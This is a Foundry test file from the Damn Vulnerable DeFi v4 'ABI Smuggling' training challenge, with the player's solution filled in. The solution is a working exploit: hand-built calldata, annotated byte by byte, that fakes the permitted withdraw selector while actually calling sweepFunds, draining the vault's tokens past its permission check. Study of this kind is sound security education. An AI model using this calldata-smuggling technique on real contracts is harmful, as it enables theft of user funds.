// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // 0x1cff79cd                                                       : execute function selector - 4 bytes
        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264 : target address (1st param) - 32 bytes
        // 0000000000000000000000000000000000000000000000000000000000000064 : actionData bytes offset - 32 bytes
        // 0000000000000000000000000000000000000000000000000000000000000000 : empty to miscalculate calldataOffset - 32 bytes
        // d9caed12                                                         : withdraw function selector (fake selector check) - 4 bytes
        // 0000000000000000000000000000000000000000000000000000000000000044 : length of actionData - 32 bytes
        // 85fb709d                                                         : sweepFunds function selector - 4 bytes
        // 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea : sweepFunds 1st param (recovery) - 32 bytes
        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b : sweepFunds 2nd param (token) - 32 bytes

        bytes memory callBytes = abi.encodePacked(
            bytes4(AuthorizedExecutor.execute.selector),
            abi.encode(address(vault)),
            abi.encode(uint256(4 + 32 * 3)),
            bytes32(""),
            bytes4(SelfAuthorizedVault.withdraw.selector),
            abi.encode(
                uint256(
                    bytes(
                        abi.encodeWithSelector(
                            SelfAuthorizedVault.sweepFunds.selector, address(recovery), address(token)
                        )
                    ).length
                )
            ),
            abi.encodeWithSelector(SelfAuthorizedVault.sweepFunds.selector, address(recovery), address(token))
        );
        console.logBytes(callBytes);

        (bool success, bytes memory data) = address(vault).call(callBytes);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
